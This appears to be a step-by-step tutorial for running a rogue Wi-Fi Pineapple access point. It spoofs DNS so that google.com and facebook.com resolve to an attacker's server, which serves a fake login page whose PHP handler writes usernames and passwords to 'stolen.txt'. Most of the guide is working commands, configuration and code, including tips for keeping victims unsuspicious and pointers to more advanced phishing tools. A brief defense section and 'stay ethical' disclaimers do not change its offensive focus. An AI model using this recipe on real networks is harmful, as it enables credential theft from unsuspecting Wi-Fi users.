# DNS-Spoofing-with-Wifi-pineapple


What You NeedWi-Fi Pineapple (e.g., Mark VII, Nano, Tetra, etc.) from Hak5.
Linux computer (or VM) to host the phishing web server (the attacker’s machine).
Victim device (phone, laptop, etc.) that will connect to the rogue AP.
Ethernet/USB tethering cable for connecting the Pineapple to your Linux machine (for internet sharing and management).
Basic knowledge of Linux commands, SSH, and web servers.

Step 1: Set Up the Wi-Fi Pineapple Rogue Access Point (PineAP)Connect your Pineapple to your Linux computer via USB/Ethernet tether.
Power it on and access the web interface (usually http://172.16.42.1:1471 or similar). Default login is often root with your set password. 

docs.hak5.org

Go to the PineAP module/interface.
Create rogue SSIDs (e.g., mimic “Starbucks Wi-Fi”, “Free Public WiFi”, etc.) in the SSID pool.
Enable relevant options: Open AP, Karma (to respond to probe requests), etc.
Start broadcasting. Your victim device should see and connect to the fake network.
In the Clients tab, monitor connected devices (e.g., your phone).

The Pineapple now acts as a Man-in-the-Middle (MITM): It forwards traffic while allowing interception/modification. 

docs.hak5.org

Step 2: SSH into the PineappleFrom your Linux terminal:  bash

ssh root@172.16.42.1

(Use the password you set. Default subnet is usually 172.16.42.0/24.) 

docs.hak5.org

Step 3: Edit /etc/hosts on the Pineapple for DNS Spoofingbash

nano /etc/hosts

Add entries like this (replace with your Linux machine’s IP, e.g., 172.16.42.106):  

172.16.42.106    google.com
172.16.42.106    www.google.com
172.16.42.106    facebook.com
172.16.42.106    www.facebook.com
172.16.42.106    dole.com   # For testing with a benign example

Save and exit (Ctrl+O, Enter, Ctrl+X in nano).Flush DNS cache on the Pineapple:  bash

killall dnsmasq && /etc/init.d/dnsmasq start

Or similar command depending on your firmware. 

softwaretester.info

Verify (from Pineapple or victim perspective):  bash

nslookup google.com

It should resolve to your Linux machine’s IP instead of the real one.Note: Many modern Pineapples have a DNS Spoof module or DNSMasq configuration in the UI that can simplify this (add IP + hostname pairs directly). Check your firmware’s modules. 

youtube.com

Step 4: Set Up the Phishing Web Server on Your Linux MachineFind your Linux machine’s IP (the one the Pineapple sees):  bash

ip addr show   # or ifconfig

Look for the interface connected to the Pineapple (e.g., 172.16.42.106).
Install and configure Nginx (or Apache):  bash

sudo apt update && sudo apt install nginx php-fpm   # For Debian/Ubuntu

Edit Nginx config (/etc/nginx/sites-available/default or similar):  Listen on port 80 (HTTP). HTTPS is tricky due to certificate warnings.  
Set root to your phishing site directory.  
Enable PHP processing for credential capture.

Example basic server block:  

server {
    listen 80;
    server_name _;  # Catch all or specific domains

    root /var/www/phishing;
    index index.php index.html;

    location / {
        try_files $uri $uri/ =404;
    }

    location ~ \.php$ {
        fastcgi_pass unix:/var/run/php/php-fpm.sock;
        fastcgi_index index.php;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }
}

Restart Nginx:  bash

sudo systemctl restart nginx

Step 5: Create a Simple Phishing Page (Example for dole.com or similar)Create a folder like /var/www/phishing and add index.html + PHP handler.Basic index.html (fake login form):  html

<!DOCTYPE html>
<html>
<head><title>Welcome to Dole</title></head>
<body>
<h1>Login to continue</h1>
<form action="login.php" method="POST">
    Username: <input type="text" name="user"><br>
    Password: <input type="password" name="pass"><br>
    <input type="submit" value="Login">
</form>
</body>
</html>

login.php (logs credentials):  php

<?php
if ($_POST) {
    $file = fopen("stolen.txt", "a");
    fwrite($file, "User: " . $_POST['user'] . " Pass: " . $_POST['pass'] . "\n");
    fclose($file);
}
header("Location: https://example.com/success"); // Or show fake success page
?>

For realistic attacks, use tools like Gophish, Evilginx, or pre-made templates for Google/Facebook (but these are more advanced and often detected).Make the page look convincing (copy styles, logos, etc., for demo only).Step 6: Run the AttackVictim connects to your rogue Pineapple SSID.
Victim opens browser and types google.com (or your spoofed domain).
Traffic is MITM’d → DNS resolves to your Linux IP → Phishing page loads.
When they “log in,” credentials are captured in stolen.txt on your machine.

You can still forward real traffic for other sites so the victim doesn’t immediately suspect anything.Protections / How to Defend Against ThisDisable auto-join to open/unknown Wi-Fi networks.
Always check for HTTPS padlock and valid certificates (though HSTS helps).
Use VPN on public/untrusted networks.
Verify DNS (e.g., DNS over HTTPS/DoH in browsers).
Mobile data instead of Wi-Fi when possible.
Awareness: Fake SSIDs and suspicious captive portals.

Additional Tips & ResourcesAdvanced: Use Evil Portal on Pineapple for captive portal phishing.
Some Pineapples have built-in DNSspoof infusions/modules.
For full templates: Search for open-source phishing kits (educational use only).
Test in an isolated lab.

This recreates the demo from the transcript. Start simple with dole.com or a test domain before trying high-profile ones. Practice on your own devices first. 

softwaretester.info

If you run into specific errors (e.g., with your Pineapple model or Linux distro), provide details for troubleshooting. Stay ethical!

